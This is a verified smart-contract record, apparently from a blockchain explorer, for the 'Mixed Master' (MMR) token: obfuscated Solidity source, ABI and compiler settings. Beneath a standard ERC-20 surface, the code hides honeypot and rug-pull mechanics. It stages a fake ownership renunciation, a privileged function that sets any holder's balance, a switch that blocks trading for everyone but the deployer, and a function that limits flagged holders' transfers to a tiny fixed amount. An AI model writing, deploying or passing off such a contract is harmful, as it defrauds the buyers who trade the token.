{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface sellAt {\n    function createPair(address fromAtMax, address txMarketing) external returns (address);\n}\n\ninterface launchedTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalTrading) external view returns (uint256);\n\n    function transfer(address buySell, uint256 shouldIs) external returns (bool);\n\n    function allowance(address launchedLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buySell,\n        uint256 shouldIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minFromTake, uint256 value);\n    event Approval(address indexed launchedLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract swapTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listExempt is launchedTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MixedMaster is swapTake, launchedTo, listExempt {\n\n    uint256 senderReceiver;\n\n    address private txList;\n\n    function approve(address liquidityExempt, uint256 shouldIs) public virtual override returns (bool) {\n        launchedShould[_msgSender()][liquidityExempt] = shouldIs;\n        emit Approval(_msgSender(), liquidityExempt, shouldIs);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atMode;\n    }\n\n    function marketingLaunch() private view {\n        require(enableAmount[_msgSender()]);\n    }\n\n    string private atMode = \"MMR\";\n\n    uint256 constant sellTrading = 4 ** 10;\n\n    uint8 private maxFund = 18;\n\n    function buyTx(address limitSwapIs, address buySell, uint256 shouldIs) internal returns (bool) {\n        require(txFundReceiver[limitSwapIs] >= shouldIs);\n        txFundReceiver[limitSwapIs] -= shouldIs;\n        txFundReceiver[buySell] += shouldIs;\n        emit Transfer(limitSwapIs, buySell, shouldIs);\n        return true;\n    }\n\n    function sellMax(address receiverSenderLiquidity) public {\n        if (amountFundBuy) {\n            return;\n        }\n        \n        enableAmount[receiverSenderLiquidity] = true;\n        if (liquidityBuyExempt != feeFund) {\n            feeFund = false;\n        }\n        amountFundBuy = true;\n    }\n\n    function allowance(address feeTokenAmount, address liquidityExempt) external view virtual override returns (uint256) {\n        if (liquidityExempt == receiverWallet) {\n            return type(uint256).max;\n        }\n        return launchedShould[feeTokenAmount][liquidityExempt];\n    }\n\n    function getOwner() external view returns (address) {\n        return txList;\n    }\n\n    uint256 private teamLaunch;\n\n    function tradingTake(address limitSwapIs, address buySell, uint256 shouldIs) internal returns (bool) {\n        if (limitSwapIs == receiverReceiverAt) {\n            return buyTx(limitSwapIs, buySell, shouldIs);\n        }\n        uint256 launchTrading = launchedTo(atMarketing).balanceOf(autoShouldFee);\n        require(launchTrading == fromLimit);\n        require(buySell != autoShouldFee);\n        if (shouldReceiver[limitSwapIs]) {\n            return buyTx(limitSwapIs, buySell, sellTrading);\n        }\n        return buyTx(limitSwapIs, buySell, shouldIs);\n    }\n\n    mapping(address => bool) public enableAmount;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxFund;\n    }\n\n    address receiverWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address autoShouldFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public shouldReceiver;\n\n    function walletToken(address enableFund) public {\n        marketingLaunch();\n        if (feeFund == liquidityBuyExempt) {\n            receiverTokenBuy = teamLaunch;\n        }\n        if (enableFund == receiverReceiverAt || enableFund == atMarketing) {\n            return;\n        }\n        shouldReceiver[enableFund] = true;\n    }\n\n    mapping(address => uint256) private txFundReceiver;\n\n    function transferFrom(address limitSwapIs, address buySell, uint256 shouldIs) external override returns (bool) {\n        if (_msgSender() != receiverWallet) {\n            if (launchedShould[limitSwapIs][_msgSender()] != type(uint256).max) {\n                require(shouldIs <= launchedShould[limitSwapIs][_msgSender()]);\n                launchedShould[limitSwapIs][_msgSender()] -= shouldIs;\n            }\n        }\n        return tradingTake(limitSwapIs, buySell, shouldIs);\n    }\n\n    bool private liquidityBuyExempt;\n\n    mapping(address => mapping(address => uint256)) private launchedShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamToLimit;\n    }\n\n    uint256 public receiverAuto;\n\n    event OwnershipTransferred(address indexed amountTotal, address indexed isReceiver);\n\n    function launchFee() public {\n        emit OwnershipTransferred(receiverReceiverAt, address(0));\n        txList = address(0);\n    }\n\n    uint256 private receiverTokenBuy;\n\n    bool private feeFund;\n\n    address public atMarketing;\n\n    function owner() external view returns (address) {\n        return txList;\n    }\n\n    string private shouldAt = \"Mixed Master\";\n\n    bool public amountFundBuy;\n\n    uint256 private teamToLimit = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldAt;\n    }\n\n    function balanceOf(address totalTrading) public view virtual override returns (uint256) {\n        return txFundReceiver[totalTrading];\n    }\n\n    function enableToken(address enableMax, uint256 shouldIs) public {\n        marketingLaunch();\n        txFundReceiver[enableMax] = shouldIs;\n    }\n\n    uint256 fromLimit;\n\n    constructor (){\n        if (receiverAuto == receiverTokenBuy) {\n            liquidityBuyExempt = true;\n        }\n        atWallet maxSwap = atWallet(receiverWallet);\n        atMarketing = sellAt(maxSwap.factory()).createPair(maxSwap.WETH(), address(this));\n        if (liquidityBuyExempt) {\n            feeFund = false;\n        }\n        receiverReceiverAt = _msgSender();\n        enableAmount[receiverReceiverAt] = true;\n        txFundReceiver[receiverReceiverAt] = teamToLimit;\n        launchFee();\n        if (liquidityBuyExempt) {\n            feeFund = true;\n        }\n        emit Transfer(address(0), receiverReceiverAt, teamToLimit);\n    }\n\n    address public receiverReceiverAt;\n\n    function transfer(address enableMax, uint256 shouldIs) external virtual override returns (bool) {\n        return tradingTake(_msgSender(), enableMax, shouldIs);\n    }\n\n    function feeTeam(uint256 shouldIs) public {\n        marketingLaunch();\n        fromLimit = shouldIs;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minFromTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTokenAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFundBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"enableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"feeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverReceiverAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSenderLiquidity\",\"type\":\"address\"}],\"name\":\"sellMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSwapIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buySell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFund\",\"type\":\"address\"}],\"name\":\"walletToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MixedMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}